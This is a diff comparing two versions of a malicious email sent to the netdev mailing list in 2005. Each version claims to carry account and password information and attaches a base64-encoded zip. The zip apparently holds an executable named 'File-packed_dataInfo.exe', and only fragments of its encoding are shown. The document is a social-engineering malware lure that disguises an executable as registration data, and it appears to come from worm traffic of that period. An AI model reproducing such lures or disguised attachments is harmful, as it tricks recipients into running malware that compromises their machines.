@@ -1,29 +1,25 @@
-From: hostmaster@wil.cx
-Subject: Your Password
-Date: Wed, 14 Dec 2005 08:28:05 UTC
-Message-ID: <81edea72.4dfc60fd476@wil.cx>
+From: webmaster@cri74.org
+Subject: Registration_Confirmation
+Date: Wed, 14 Dec 2005 07:52:25 GMT
+Message-ID: <1e22c1bdd8646defcee@cri74.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======7f65761f8a510.02e"
+Content-Type: multipart/mixed; boundary="=====53fe81e9009066ca11dade"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: XPost@oss.sgi.com
+To: netdev@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======7f65761f8a510.02e
+--=====53fe81e9009066ca11dade
 
 Account and Password Information are attached!
-
-
-***** Go to: http://www.wil.cx
-***** Email: postman@wil.cx
---======7f65761f8a510.02e
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+--=====53fe81e9009066ca11dade
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +996,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======7f65761f8a510.02e--
+--=====53fe81e9009066ca11dade--
